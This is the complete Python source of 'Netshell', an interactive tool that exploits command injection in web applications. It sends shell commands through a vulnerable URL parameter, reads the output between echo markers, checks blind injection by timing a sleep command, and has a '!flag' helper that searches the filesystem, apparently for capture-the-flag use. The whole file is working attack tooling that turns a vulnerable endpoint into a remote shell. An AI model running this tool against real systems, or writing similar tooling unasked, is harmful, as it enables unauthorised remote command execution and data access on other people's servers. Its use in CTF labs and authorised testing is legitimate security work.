import os
import sys
import random
import string
import argparse
from html import unescape

from urllib import response
import urllib.parse
from urllib.parse import urlsplit, urlunsplit, parse_qsl, urlencode
import requests
from prompt_toolkit import PromptSession
from prompt_toolkit.history import FileHistory
from prompt_toolkit.auto_suggest import AutoSuggestFromHistory


VERSION = "1.2.0"
HISTORY_LOCATION = ".netshell_history"
QUERY_PLACEHOLDER = "--NETSHELL_PLACEHOLDER--"

# Configuration
address : str
parameter : str
url_encode = True
verbose = False
cookies = None
user_agent = None
prefix = None
suffix = None
no_preflight = False
no_history = False
blind = False


def pinfo(message):
    if verbose:
        print(f'[i] {message}')
        
def palert(message):
    print(f'[!] {message}')

def random_string(length=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
    
    
def extract_markers(response_text, start_marker, end_marker):
    start_index = response_text.find(start_marker)
    end_index = response_text.find(end_marker, start_index + len(start_marker))
    
    if start_index == -1 or end_index == -1:
        return None
    
    return response_text[start_index + len(start_marker):end_index].strip()

def set_query_param(address: str, key: str, value: str) -> str:
    parts = urlsplit(address)
    query = dict(parse_qsl(parts.query, keep_blank_values=True))
    query[key] = value
    new_query = urlencode(query)
    return urlunsplit((parts.scheme, parts.netloc, parts.path, new_query, parts.fragment))
    
def send_command(command, raw_response=False):
    wrapped_command = command
    start_marker = end_marker = None
    
    if not blind:
        start_marker = f"--{random_string(8)}--"
        end_marker = f"--{random_string(8)}--"
        
        start_marker_command = f"echo {start_marker};"
        end_marker_command = f";echo {end_marker}"
        
        wrapped_command = f"{start_marker_command}{command}{end_marker_command}"
    
    if prefix:
        wrapped_command = f"{prefix}{wrapped_command}"
    if suffix:
        wrapped_command = f"{wrapped_command}{suffix}"
    
    if url_encode:
        wrapped_command = urllib.parse.quote(wrapped_command)
    
    # Insert a placeholder in the URL and replace it with the wrapped command to ensure proper encoding and avoid issues with special characters in the command
    url = set_query_param(address, parameter, QUERY_PLACEHOLDER)
    url = url.replace(QUERY_PLACEHOLDER, wrapped_command)
    
    pinfo(f"Sent command: {url}")
    if len(url) > 2000:
        print(f"The URL length is very long: {len(url)} characters. Some servers may not process it correctly.")
    response = requests.get(url, cookies=cookies, headers={'User-Agent': user_agent} if user_agent else None)
    pinfo(f"Status code: {response.status_code}")
    pinfo(f"Response size: {len(response.text)}")
    
    if raw_response:
        return response
    
    if response.status_code != 200:
        palert(f"Command execution failed with status code: {response.status_code} and response: {response.text}")
        return None
    
    if blind:
        pinfo("Command sent in blind mode, no output will be returned.")
        return None
    
    unescaped_response = unescape(response.text)
    return extract_markers(unescaped_response, start_marker, end_marker)


def preflight_request():
    if blind:
        return blind_preflight_request()
    
    preflight_random = random_string(16)
    preflight_echo = f"echo {preflight_random}"
    
    response = send_command(preflight_echo)
    if not response:
        palert(f"Preflight request failed: No echo response received meaning the injection might not work properly. If this is a blind injection, consider using the --blind flag to disable output retrieval and avoid preflight checks.")
        return False
    if preflight_random not in response:
        palert(f"Preflight request failed: Could not verify command output.")
        return False
    return True

def blind_preflight_request():
    time = 1 # seconds
    delta_buffer = time * 0.8 # 20% buffer to account for network latency and processing time
    preflight_slow_command = f"sleep {time}"
    preflight_fast_command = f"echo {time}"
    
    # Fast command speed
    pinfo("Performing blind preflight check: Sending a fast command to measure response time using command: " + preflight_fast_command)
    fast_response = send_command(preflight_fast_command, raw_response=True)
    fast_time = fast_response.elapsed.total_seconds()
    pinfo(f"Fast command response time: {fast_time}s")
    if fast_response is None or fast_response.status_code != 200:
        palert(f"Blind preflight request failed: Could not execute command. Response: {fast_response}")
        return False
    
    # Slow command speed
    pinfo("Performing blind preflight check: Sending a slow command to measure response time using command: " + preflight_slow_command)
    slow_response = send_command(preflight_slow_command, raw_response=True)
    slow_time = slow_response.elapsed.total_seconds()
    pinfo(f"Slow command response time: {slow_time}s")
    if slow_response is None or slow_response.status_code != 200:
        palert(f"Blind preflight request failed: Could not execute command. Response: {slow_response}")
        return False
    
    # Analyze response times
    if slow_time < fast_time + delta_buffer:
        palert(f"Blind preflight request failed: Response time difference between `echo {time}` and `sleep {time}` is too small. Fast time: {fast_time}s, Slow time: {slow_time}s. This may indicate that command execution is not working properly or that the server is not processing the commands as expected.")
        return False
    
    return True


def command_flag() -> bool:
    find_command = 'find / -type f -name "*flag*" 2>/dev/null'
    response = send_command(find_command)
    if not response:
        return False
    
    paths = response.strip().splitlines()
    prime_candidates = []
    for path in paths:
        if path.endswith("flag.txt") or path.endswith("flag.md"):
            prime_candidates.append(path)
    print(f"[] Prime candidates for flag files:\n{'\\n'.join(prime_candidates)}\n")
    print(f"[] All found files:\n{response}")
    return True


def command_save(command: str, content: str) -> bool:
    path = command[len('!save '):].strip()
    if not path:
        print("[!] No file path provided. Usage: !save <local_file_path>")
        return False
    
    # Get full path
    full_path = os.path.abspath(path)
    
    try:
        with open(full_path, 'w') as f:
            f.write(content)
    except Exception as e:
        print(f"[!] Error saving file: {e}")
        return False
    
    print(f"[i] Output saved to {full_path}")
    return True


def main():
    global address, parameter, url_encode, verbose, cookies, user_agent, prefix, suffix, no_preflight, blind
    parser = argparse.ArgumentParser(description=f"Netshell v{VERSION} - A lightweight HTTP CLI Shell that enables custom command injections into vulnerable web applications with a familiar shell-like interface.")
    parser.add_argument("--address", "-a", help="Target address containing the full path. E.g., http://example.com/vulnerable.php")
    parser.add_argument("--parameter", "-p", help="Parameter name where the injection will occur. E.g., 'cmd' for http://example.com/vulnerable.php?cmd=...")
    parser.add_argument("--cookies", "-c", help="Use cookies for the request")
    parser.add_argument("--agent", help="Set a custom User-Agent header for the requests")
    parser.add_argument("--prefix", "-P", help="Set a custom prefix for the commands. This is usually the command escape. By default there is none.")
    parser.add_argument("--suffix", "-S", help="Set a custom suffix for the commands. This is usually the command escape. By default there is none.")
    parser.add_argument("--blind", "-b", action="store_true", help="Enable blind command execution (no output returned). The preflight checks will be adapted to detect blind command execution based on response times.")


    parser.add_argument("--verbose", "-v", action="store_true", help="Verbose output")
    parser.add_argument("--no-url-encode", action="store_true", help="Disable URL encoding of commands")
    parser.add_argument("--no-preflight", action="store_true", help="Skip preflight checks and go straight to the shell interface")
    parser.add_argument("--no-history", action="store_true", help=f"Skip saving command history into {HISTORY_LOCATION} file")

    if len(sys.argv) == 1:
        parser.print_help()
        return

    args = parser.parse_args()

    address = args.address
    parameter = args.parameter
    url_encode = not args.no_url_encode
    verbose = args.verbose
    cookies = args.cookies
    user_agent = args.agent
    prefix = args.prefix
    suffix = args.suffix
    blind = args.blind
    
    no_preflight = args.no_preflight
    if not no_preflight:
        is_successful = preflight_request()
        if is_successful:
            print("Connection successful!")
    else:
        print("Skipping preflight checks.")
    
    host_name = urllib.parse.urlparse(address).netloc
    
    print(f"Entering interactive shell: all commands except ones starting with ! are sent to the server.\nType '!exit' or Ctrl+C to leave and '!help' for available Netshell commands.")

    # Shell-like environment
    session = PromptSession(
        history=FileHistory(HISTORY_LOCATION) if not no_history else None,
        auto_suggest=AutoSuggestFromHistory(),
    )
    output = None
    try:
        while True:
            command = session.prompt(f"\n{host_name} > ")
            if command.lower().startswith('!exit'):
                print("Exiting shell.")
                break
            elif command.lower().startswith('!help'):
                print("\nAll Netshell commands start with '!' and are used to control the shell or automate tasks. Other commands are sent to the server. All command only work on Linux systems. Available commands:")
                print("  !exit - Exit the shell")
                print("  !help - Show this help message")
                print("  !flag - Search for files with 'flag' in their name and display potential candidates")
                print("  !save <local_file_path> - Save the output of the last command to a local file on your machine. E.g., '!save output.txt'")
                print("\nAuthor: Richard A. Dubniczky, https://dubniczky.com")
                print("Source: https://github.com/dubniczky/Netshell")
                output = ''
            elif command.lower().startswith('!flag'):
                if not command_flag():
                    print("[!] There was an error while searching for flag files.")
                output = ''
            elif command.lower().startswith('!save'):
                if not output:
                    print("[!] No command output available to save.")
                    continue
                command_save(command, output)
                output = ''
            elif command.startswith('!'):
                print(f"[!] Unknown Netshell command: {command}. Type '!help' for available commands.")
                output = ''
            try:
                output = send_command(command)
            except Exception as e:
                print(f"[!] Error occurred while sending command: {e}")
                continue
            if blind:
                print("<Command executed without output.>")
            elif output is not None:
                print(f"{output}")
            else:
                print("<No output received or command execution failed.>")
    except KeyboardInterrupt:
        print("\nExiting shell.")


if __name__ == "__main__":
    main()
